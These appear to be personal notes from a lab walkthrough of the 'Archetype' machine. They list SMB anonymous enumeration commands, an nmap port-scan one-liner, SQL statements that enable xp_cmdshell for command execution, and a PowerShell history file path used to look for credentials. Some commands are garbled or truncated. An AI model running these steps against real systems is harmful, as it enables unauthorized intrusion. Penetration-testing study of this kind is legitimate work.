Intended to capture observations during the walkthroughs for processes to apply or things to  remember when coming across certain steps during information gathering.

# Archetype
- If you see SMB, see if anonymous access is granted
    - `smbclient -N -L \\\\IP_ADDR\\`
    - If any are interesting, try to connect with `smbclient -N \\\IP_ADDR\shared_drive_name`

## `nmap`
Clever way to filter out the ports to analyze in greater detail:
```
ports=$(nmap -p- --min-rate=1000  -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)nmap -sC-sV-p$ports10.10.10.27
```

## SQL
`SQL> SELECT IS_SRVROLEMEMBER ('sysadmin')` run once authenticated to SQL DB to reveal whether current user has sysadmin privs
- Can enaable `xp_cmdshell`, with the following script:
```
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;sp_configure;
EXEC sp_configure 'xp_cmdshell', 1;
reconfigure;
xp_cmdshell "whoami";
```

## Powershell
Powershell history file: `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.tx`